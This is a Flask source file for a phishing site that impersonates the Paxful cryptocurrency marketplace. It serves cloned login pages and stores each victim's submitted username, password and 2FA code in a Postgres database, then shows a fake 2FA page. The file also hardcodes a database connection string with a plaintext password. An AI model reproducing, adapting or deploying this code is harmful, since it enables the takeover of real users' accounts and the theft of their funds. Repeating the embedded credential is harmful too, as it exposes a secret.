from flask import Flask, render_template, send_file, make_response, request
from flask_sqlalchemy import SQLAlchemy # type: ignore

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgres://paxful_user:OqblaLk2WBi6H2vxUEo1AMIYfgz6mThi@dpg-coqrfaa1hbls73esbkfg-a/paxful'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Define a model for storing usernames, passwords, and 2FA codes
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    twofa = db.Column(db.String(10), nullable=True)

@app.route("/", methods=['GET', 'POST'])
def index(): 
    return render_template("home3.html")

@app.route("/home", methods=['GET', 'POST'])
def home(): 
    return render_template("paxredirection.html")

@app.route("/accounts.paxful.com", methods=['GET', 'POST'])
def accounts_paxful_com(): 
     response = make_response(send_file("templates/paxful.html"))
     response.headers.add("Access-Control-Allow-Origin", "*")
     return response

@app.route("/paxful.com", methods=['GET', 'POST'])
def auth():
    if request.method == 'POST':
        # Get username and password from the paxful.html template
        username = request.form['username']
        password = request.form['password']
        
        # Get the 2FA code from the paxful2fa.html template
        twofa = request.form['twofa']
        
        # Create a new User object and add it to the database
        new_user = User(username=username, password=password, twofa=twofa)
        db.session.add(new_user)
        db.session.commit()
        
        return send_file("templates/paxful2fa.html")
        
    return "Method Not Allowed"

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5002)
